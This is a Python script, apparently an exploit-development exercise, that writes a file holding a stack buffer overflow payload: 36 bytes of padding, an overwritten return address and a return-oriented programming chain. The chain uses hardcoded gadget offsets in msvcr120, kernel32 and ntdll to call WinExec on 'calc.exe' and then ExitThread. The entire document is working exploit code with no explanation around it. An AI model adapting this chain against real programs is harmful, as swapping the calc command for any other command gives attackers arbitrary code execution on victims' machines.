import struct

def write_file(file_path):
    # NOTE: The rop_chain can't contain any null bytes.

    msvcr120 = 0x6cf70000
    kernel32 = 0x77120000
    ntdll = 0x77630000

    WinExec = kernel32 + 0x92ff1
    ExitThread = ntdll + 0x5801c
    lpCmdLine = 0xffffffff
    uCmdShow = 0x01010101
    dwExitCode = 0xffffffff
    ret_for_ExitThread = 0xffffffff

    # These are just padding values.
    for_ebp = 0xffffffff
    for_ebx = 0xffffffff
    for_esi = 0xffffffff
    for_retn = 0xffffffff

    rop_chain = [
        msvcr120 + 0xc041d,  # ADD ESP,24 # POP EBP # RETN
# cmd:
        "calc",
        ".exe",
# cmd+8:
        0xffffffff,          # zeroed out at runtime
# cmd+0ch:
        WinExec,
        ExitThread,
# cmd+14h:
        lpCmdLine,           # arg1 of WinExec (computed at runtime)
        uCmdShow,            # arg2 of WinExec
        ret_for_ExitThread,  # not used
        dwExitCode,          # arg1 of ExitThread
# cmd+24h:
        for_ebp,
        ntdll + 0xa3f07,     # INC ESI # PUSH ESP # MOV EAX,EDI # POP EDI # POP ESI # POP EBP # RETN 0x04
        # now edi = here

# here:
        for_esi,
        for_ebp,
        msvcr120 + 0x45042,  # XCHG EAX,EDI # RETN
        for_retn,
        # now eax = here

        msvcr120 + 0x92aa3,  # SUB EAX,7 # POP EBX # POP EBP # RETN
        for_ebx,
        for_ebp,
        msvcr120 + 0x92aa3,  # SUB EAX,7 # POP EBX # POP EBP # RETN
        for_ebx,
        for_ebp,
        msvcr120 + 0x92aa3,  # SUB EAX,7 # POP EBX # POP EBP # RETN
        for_ebx,
        for_ebp,
        msvcr120 + 0x92aa3,  # SUB EAX,7 # POP EBX # POP EBP # RETN
        for_ebx,
        for_ebp,
        msvcr120 + 0x92aa3,  # SUB EAX,7 # POP EBX # POP EBP # RETN
        for_ebx,
        for_ebp,
        msvcr120 + 0xbfe65,  # SUB EAX,2 # POP EBP # RETN
        for_ebp,
        kernel32 + 0xb7804,  # INC EAX # RETN
        # now eax = cmd+8

        # do [cmd+8] = 0:
        msvcr120 + 0x76473,  # XOR ECX,ECX # XCHG ECX,DWORD PTR [EAX] # POP ESI # POP EBP # RETN
        for_esi,
        for_ebp,
        msvcr120 + 0xbfe65,  # SUB EAX,2 # POP EBP # RETN
        for_ebp,
        # now eax+0eh = cmd+14h (i.e. eax = cmd+6)

        # do ecx = eax:
        msvcr120 + 0x3936b,  # XCHG EAX,ECX # MOV EDX,653FB4A5 # RETN
        kernel32 + 0xb7a0a,  # XOR EAX,EAX # RETN
        kernel32 + 0xbe203,  # XOR EAX,ECX # POP EBP # RETN 0x08
        for_ebp,
        msvcr120 + 0xbfe65,  # SUB EAX,2 # POP EBP # RETN
        for_retn,
        for_retn,
        for_ebp,
        msvcr120 + 0xbfe65,  # SUB EAX,2 # POP EBP # RETN
        for_ebp,
        msvcr120 + 0xbfe65,  # SUB EAX,2 # POP EBP # RETN
        for_ebp,
        # now eax = cmd

        msvcr120 + 0x3936b,  # XCHG EAX,ECX # MOV EDX,653FB4A5 # RETN
        # now eax+0eh = cmd+14h
        # now ecx = cmd

        kernel32 + 0xa04fc,  # MOV DWORD PTR [EAX+0EH],ECX # POP EBP # RETN 0x10
        for_ebp,
        msvcr120 + 0x3936b,  # XCHG EAX,ECX # MOV EDX,653FB4A5 # RETN
        for_retn,
        for_retn,
        for_retn,
        for_retn,
        msvcr120 + 0x1e47e,  # ADD EAX,0C # RETN
        # now eax = cmd+0ch

        # do esp = cmd+0ch:
        kernel32 + 0x489c0,  # XCHG EAX,ESP # RETN
    ]

    rop_chain = ''.join([x if type(x) == str else struct.pack('<I', x)
                         for x in rop_chain])

    with open(file_path, 'wb') as f:
        ret_eip = kernel32 + 0xb7805            # RETN
        name = 'a'*36 + struct.pack('<I', ret_eip) + rop_chain
        f.write(name)


write_file(r'c:\name.dat')
